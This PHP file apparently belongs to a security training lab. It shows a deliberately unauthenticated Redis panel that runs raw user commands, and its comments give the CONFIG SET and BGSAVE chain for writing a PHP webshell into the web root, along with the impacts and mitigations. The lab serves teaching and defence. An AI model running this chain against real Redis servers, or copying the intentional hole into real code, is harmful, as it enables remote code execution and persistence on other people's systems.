<?php
// ============================================================
// Lab 3: CONFIG SET. File Write (Source Code)
// ============================================================
// Engine: Redis (Simulated) with CONFIG command support
// Data: /home/kali/SQLi-Arena/data/redis/lab3.json
// ============================================================

// Redis admin panel: provides direct command execution
// No authentication required (misconfiguration)

// User submits raw Redis commands via GET parameter
$rawCmd = $_GET['cmd'];  // Full Redis command from user

// The command is parsed and executed directly
// Available: SET, GET, CONFIG, SAVE, BGSAVE, KEYS, INFO

// --- CONFIG SET Attack Chain ---

// Step 1: Change the dump directory to web root
// CONFIG SET dir /var/www/html/

// Step 2: Change the dump filename to a PHP file
// CONFIG SET dbfilename shell.php

// Step 3: Store a PHP webshell payload in a key
// SET payload "<?php system($_GET['cmd']); ?>"

// Step 4: Trigger a database save: writes all data to the new file
// BGSAVE

// Result: /var/www/html/shell.php is created with Redis dump format
// containing the PHP payload. The PHP engine ignores the Redis binary
// header and executes the PHP code embedded within.

// --- Why is this vulnerable? ---
// 1. No authentication (requirepass not set)
// 2. CONFIG SET is not disabled/renamed
// 3. Redis process has write permissions to the web root
// 4. The dump format allows embedding arbitrary strings (SET values)
//    that survive the binary wrapper

// --- Real-world Impact ---
// - Arbitrary file write to any directory Redis can access
// - Webshell creation for Remote Code Execution
// - Crontab injection (/var/spool/cron/) for persistence
// - SSH key injection (~/.ssh/authorized_keys)

// --- Mitigations ---
// 1. Set requirepass with a strong password
// 2. Rename dangerous commands: rename-command CONFIG ""
// 3. Bind to localhost only: bind 127.0.0.1
// 4. Run Redis as non-privileged user
// 5. Use protected-mode yes
// 6. Restrict file system permissions
?>
